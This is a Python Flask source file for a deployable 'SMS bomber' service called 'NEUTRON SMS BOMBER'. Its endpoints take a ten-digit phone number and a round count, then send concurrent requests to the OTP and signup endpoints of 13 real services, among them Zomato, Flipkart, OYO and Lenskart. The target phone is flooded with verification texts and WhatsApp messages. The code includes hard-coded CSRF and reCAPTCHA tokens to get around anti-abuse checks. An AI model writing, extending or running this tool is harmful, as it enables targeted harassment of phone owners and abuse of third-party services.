import os
from flask import Flask, request, jsonify
import requests
import threading
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

app = Flask(__name__)

# ==================== CONFIG ====================
TIMEOUT = 5
MAX_THREADS = 100
REQUEST_DELAY = 0.1

# ==================== API BOMBER CLASS ====================
class APIBomber:
    def __init__(self, phone):
        self.phone = phone
        self.masked_phone = "*******" + phone[-4:]
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; RMX3782 Build/AP3A.240617.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.7827.159 Mobile Safari/537.36'
        })
    
    def earningzone(self):
        url = f"https://earningzone.shop/BOOMB/={self.phone}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        try:
            r = self.session.get(url, headers=headers, timeout=TIMEOUT)
            return {"name": "EarningZone", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "EarningZone", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def nobroker(self):
        url = "https://www.nobroker.in/api/v3/account/otp/send"
        payload = {'phone': self.phone, 'countryCode': 'IN'}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.nobroker.in',
            'Referer': 'https://www.nobroker.in/'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "NoBroker", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "NoBroker", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def rupee112(self):
        url = "https://www.rupee112.com/login-sbm"
        payload = {
            'mobile': self.phone,
            'current_page': 'login',
            'is_existing_customer': '2',
            'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
        }
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.rupee112.com',
            'Referer': 'https://www.rupee112.com/apply-now?utm_source=GOOGLE'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Rupee112", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Rupee112", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def gimbooks_otp(self):
        url = "https://www.gimbooks.com/v4/account/auth/get-otp-v2/"
        payload = {
            'phone': self.phone,
            'recaptcha-token': '0cAFcWeA73qBHCwviY-hs09fJMh5YVmZEBlLGRDaRe6z3tsldvtOYctJDFReBcvvHmhu-7zlRpjnpSxeYmFt8Kt_DLBbSy28QjnnnDbBIw8iwbMjmg8SleFJC8rZ4n24uSL6WIWkMt7bx0suW7-Pe2Q7T3EZLsaJjMWBbYW1_eIvZP-b-dtezzjCsLY41AGXBjHO1x6FJyrKYttS7BJK6IDWK0dXgTucyv4nf537cngoH5eyffUGqCneAnUAdYfXU9RE5DDC8_OPIuVvZqj_H21SsPJ08LjoYYEpgADDXZTT6Nah-dvGKQPqCdBNHotcjGrXS7nzA-XPGtwzlB-_z6FEhaGGyE2cO5q_p_Ac8almFTdetGl4kR6HiKAJiT2apwt_GsQLggvLKVUQ5d-11x7iUz1t9COW16Jos58v84BftYXmpSHqd4Qr0dQLyz_1ZzVDcS5AIyyoxu_E_SXsRw2UG3BqaskgyFVBoANIk2AgVsquiETSmbSmQau6FWOmESrxYS0i12DW7iIoiTAWkBytBOLyEGmAOD0E8jZot7ARFOiz8gVMXZjQksiKKgSlXt6VhWRQG31jW36V--5VPM87DndzltmFiR0RrhDNuvNZ9wuytDC_qFXfjzkqynp1RrTpuwqGhCzlvkObnBrDdHbdjaTT_PbK2cCEX6I0Necyfu12vLfXCBRy7yDH_X5n-IcL8WVeH-msu56ZTTGYSHfddxTSlq6DFtYbcKwj-X1MidjXik3fcPPIsOGOBQYnsy2VCwieOu3_Ju-kb4zH_sPWn7qn6I_cTbfYS_1oria3ZCTrUYQ_Rcov9yFfJTl05NsRltndMM8rYk-o3CCpzaZfmaw53EmTohNkGiCXRqPkMl87czDk4MM-8E-QX-Kc51QJNXWN1qb8AHBX9W0ot6sEV-ZolAZG3VaT4919ItC-rV9HC7OhsJY8pYyOXevHX5AMlWEeA9Jfli-QnF16HWv-2vg_7W9ufRU72qLyLuudYk9-qsB_vvHT0krH1jeZtA1qzcqsiLYXtSWzmgqcHqZPWmzuw8n3Z-RDE57srY8wM5vHxsDvzYeEruiFyzuKRAfxmKbqvpmU8plEmlaZ59PsQh9aUaD_dGcyi1L-iHLEoJ_LARkuaNTsLvvu0wROo-HGDnPWHZYBni08EY5uyiz9kZzTEP5N7ns0q2APLRwV2zQJp6YNlNEOOope28wOlg1xR9vTpH023Li4OY2sD0EYKnHnDVjEska2H43ayb0fEq-xxECoebMcbAcbt9YBcA1kRt0X-MP8xb89XXr4Ww9sq2jCSsr8Oz99J-XqxJMCsGpyEdykfkYQ2qbvVUIr5s0W84TvZZKEP3XqfoM7bss6c8ziNMfX2k0AW78tDJNH0DQ9QuJxHaq1VNNg5vLN9bA6zScwwDe26BUivHT39xzts3OKHLdAnshpkSEHuT7B8LmuDb14B9iFAtJd2QA2Rb7TxnQOw9t0wIjmb1Qt0wDniEg40i7Rmuv3cj7lxTT3XRIcgjnO7IM0ULS_zFR5E91nlSATV9HWMshvfP3C3f6OE8ABpdst_clTdAaxlaabuAK-ppKYTLBUNx9_4UnBZspTQV4GOXJ5Q77xiHLHu0cY6RZOPR2Ul_EiJ8g0zmGpp1kkFmFBUf57gXF7dRUI2Mkb_-oFyWTkZRYMP2ZOVeY0Oix4QfxL1gofgQNWHswt-8sFu32ZooyNusdpDZ3cViyXSPT4ZHPAPjCji4EOI1n0x5EQ1OwI9VSJEMGaJUwMJgS_xFN6C_feUsuHlxLfByrYD1xq20YDm_z2HlYJRO6Pa9qeO4uUgdR0ckOQm0WkwlLU9hRq3YzMvxM44z9rYJnhBePDU90_tOJhcDdzV0wmkeqGoifVhKVldXBBbrKeVemZz97LI4PqJn6EM-d_S37UGI26RqhLZ967Yeg02oNe3FfpilPX4UF-sXaueiwq_6Ixz61FNZG7p74VqkcXE-o0CNGmrhNFrIxgvnqVKx5qI-jndFIB3kHpvCapZQKyEJvjVi6KFZ6K6ECnShi5Tjrks5udnZz-W6_je-HflkCEIVRQEJmWP9pJlS0XLesuNz8RsY7xu4A7ZJvPeVq0srM3aKf7ZfmRHIgjlZ9Rk6eiJu_SR0XmPzJH0ydhrKTmWYU3HEjOaSxa7lWP-gMJIZGJBsqJ3hJu6FyM0Es5w2X-AFqp6Ur3drip5fqgeqfahUrBbctUpJ1GZ7cuzaIwcPgBF2uxp1UgT4rI-29Tr5DP2zsaXh_FLzJ2q-W3oN3ygxTNSfdPDw247gxi-KZoEUd72Sb2aN2jo-',
            'recaptcha-site-key': '6LcE_6sqAAAAAEJ-NSsL69DegkaUVxPy5DVJac8L'
        }
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://dashboard.gimbooks.com',
            'Referer': 'https://dashboard.gimbooks.com/'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Gimbooks", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Gimbooks", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def zomato(self):
        url = "https://accounts.zomato.com/login/phone"
        payload = {
            'country_id': '1',
            'number': self.phone,
            'type': 'initiate',
            'csrf_token': 'd34a8614dc3898e9a3a9f7ebd4066f09',
            'lc': '92531e7620c648ee8676220e0dfda19b',
            'verification_type': 'sms'
        }
        headers = {
            'X-Requested-With': 'mark.via.gp',
            'Origin': 'https://accounts.zomato.com',
            'Referer': 'https://accounts.zomato.com/zoauth/login?login_challenge=92531e7620c648ee8676220e0dfda19b'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Zomato", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Zomato", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def oyo(self):
        url = "https://www.oyorooms.com/api/pwa/generateotp"
        params = {'locale': 'en'}
        payload = json.dumps({'phone': self.phone, 'country_code': '+91', 'nod': 4})
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'mark.via.gp',
            'Origin': 'https://www.oyorooms.com',
            'Referer': 'https://www.oyorooms.com/login/'
        }
        try:
            r = self.session.post(url, params=params, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "OYO", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "OYO", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def lenskart(self):
        url = "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp"
        payload = json.dumps({'phoneCode': '+91', 'telephone': self.phone})
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'mark.via.gp',
            'Origin': 'https://www.lenskart.com',
            'Referer': 'https://www.lenskart.com/'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Lenskart", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Lenskart", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def flipkart(self):
        url = "https://2.rome.api.flipkart.com/1/action/view"
        payload = json.dumps({
            'actionRequestContext': {
                'type': 'LOGIN_IDENTITY_VERIFY',
                'loginIdPrefix': '+91',
                'loginId': self.phone,
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE'
            }
        })
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'mark.via.gp',
            'Origin': 'https://www.flipkart.com',
            'Referer': 'https://www.flipkart.com/'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Flipkart", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Flipkart", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def shopsy(self):
        url = "https://www.shopsy.in/2.rome/api/1/action/view"
        payload = json.dumps({
            'actionRequestContext': {
                'loginIdPrefix': '+91',
                'loginId': self.phone,
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE'
            }
        })
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'mark.via.gp',
            'Origin': 'https://www.shopsy.in',
            'Referer': 'https://www.shopsy.in/login'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "Shopsy", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "Shopsy", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def kpnfresh(self):
        url = "https://api.kpnfresh.com/s/authn/api/v1/otp-generate"
        params = {'channel': 'WEB', 'version': '1.0.0'}
        payload = json.dumps({'phone_number': {'number': self.phone, 'country_code': '+91'}})
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'mark.via.gp',
            'Origin': 'https://www.kpnfresh.com',
            'Referer': 'https://www.kpnfresh.com/'
        }
        try:
            r = self.session.post(url, params=params, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "KPNFresh", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "KPNFresh", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def igp(self):
        url = "https://www.igp.com/v2/loginSignup"
        payload = json.dumps({
            'mprefix': '91',
            'mob': self.phone,
            'verifyOtp': False
        })
        headers = {
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.igp.com',
            'Referer': 'https://www.igp.com/'
        }
        try:
            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
            return {"name": "IGP", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "IGP", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def gritzo_whatsapp(self):
        url = f"https://www.gritzo.com/veronica/user/validate/whatsapp/187/{self.phone}/signup"
        params = {'plt': '2', 'st': '187'}
        headers = {
            'X-Requested-With': 'mark.via.gp',
            'Referer': 'https://www.gritzo.com/'
        }
        try:
            r = self.session.get(url, params=params, headers=headers, timeout=TIMEOUT)
            return {"name": "GritzoWA", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "GritzoWA", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def gritzo_sms(self):
        url = f"https://www.gritzo.com/veronica/user/validate/187/{self.phone}/signup"
        params = {'plt': '2', 'st': '187'}
        headers = {
            'X-Requested-With': 'mark.via.gp',
            'Referer': 'https://www.gritzo.com/'
        }
        try:
            r = self.session.get(url, params=params, headers=headers, timeout=TIMEOUT)
            return {"name": "GritzoSMS", "status": r.status_code, "success": r.status_code == 200}
        except Exception as e:
            return {"name": "GritzoSMS", "status": "FAIL", "error": str(e)[:30], "success": False}
    
    def attack_round(self):
        apis = [
            (self.earningzone, "EarningZone"),
            (self.nobroker, "NoBroker"),
            (self.rupee112, "Rupee112"),
            (self.gimbooks_otp, "Gimbooks"),
            (self.zomato, "Zomato"),
            (self.oyo, "OYO"),
            (self.lenskart, "Lenskart"),
            (self.flipkart, "Flipkart"),
            (self.shopsy, "Shopsy"),
            (self.kpnfresh, "KPNFresh"),
            (self.igp, "IGP"),
            (self.gritzo_whatsapp, "GritzoWA"),
            (self.gritzo_sms, "GritzoSMS"),
        ]
        
        results = []
        with ThreadPoolExecutor(max_workers=min(MAX_THREADS, len(apis))) as executor:
            futures = {executor.submit(func): name for func, name in apis}
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
        
        return results

# ==================== ROUTES ====================

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "online",
        "service": "NEUTRON SMS BOMBER API",
        "version": "3.0 - RENDER EDITION",
        "developer": "ROHIT HACKER",
        "endpoints": {
            "/bomb/<phone>": "GET - Single round attack",
            "/bomb/<phone>/<rounds>": "GET - Multiple rounds attack",
            "/status": "GET - API status",
            "/apis": "GET - List all APIs"
        }
    })

@app.route('/bomb/<phone>', methods=['GET'])
def bomb_direct(phone):
    if len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number (must be 10 digits)"}), 400
    
    masked = "*******" + phone[-4:]
    bomber = APIBomber(phone)
    results = bomber.attack_round()
    
    success_count = sum(1 for r in results if r.get('success', False))
    fail_count = len(results) - success_count
    
    return jsonify({
        "status": "completed",
        "target": masked,
        "round": 1,
        "total_apis": len(results),
        "success_count": success_count,
        "failed_count": fail_count,
        "results": results
    })

@app.route('/bomb/<phone>/<int:rounds>', methods=['GET'])
def bomb_direct_rounds(phone, rounds):
    if len(phone) != 10 or not phone.isdigit():
        return jsonify({"error": "Invalid phone number (must be 10 digits)"}), 400
    
    if rounds > 50:
        rounds = 50
    if rounds < 1:
        rounds = 1
    
    masked = "*******" + phone[-4:]
    bomber = APIBomber(phone)
    all_results = []
    total_success = 0
    total_failed = 0
    
    for round_num in range(1, rounds + 1):
        results = bomber.attack_round()
        success_count = sum(1 for r in results if r.get('success', False))
        fail_count = len(results) - success_count
        total_success += success_count
        total_failed += fail_count
        
        all_results.append({
            "round": round_num,
            "success": success_count,
            "failed": fail_count,
            "details": results
        })
        
        if round_num < rounds:
            time.sleep(REQUEST_DELAY)
    
    return jsonify({
        "status": "completed",
        "target": masked,
        "total_rounds": rounds,
        "total_apis": 13,
        "total_success": total_success,
        "total_failed": total_failed,
        "rounds": all_results
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        "status": "online",
        "service": "NEUTRON SMS BOMBER - RENDER EDITION",
        "threads": MAX_THREADS,
        "timeout": TIMEOUT,
        "apis": 13,
        "developer": "ROHIT HACKER",
        "powered_by": "NEUTRON ENGINE"
    })

@app.route('/apis', methods=['GET'])
def list_apis():
    apis = [
        "EarningZone", "NoBroker", "Rupee112", "Gimbooks", 
        "Zomato", "OYO", "Lenskart", "Flipkart", 
        "Shopsy", "KPNFresh", "IGP", "GritzoWA", "GritzoSMS"
    ]
    return jsonify({
        "total": len(apis),
        "apis": apis,
        "status": "active"
    })

# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("""
    ╔═══════════════════════════════════════════╗
    ║   🚀 NEUTRON SMS BOMBER - RENDER EDITION ║
    ╠═══════════════════════════════════════════╣
    ║   Developer: ROHIT HACKER                ║
    ║   APIs Loaded: 13                       ║
    ║   Server: http://0.0.0.0:%s           ║
    ║   FAST MODE: ON ⚡                       ║
    ╚═══════════════════════════════════════════╝
    """ % port)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)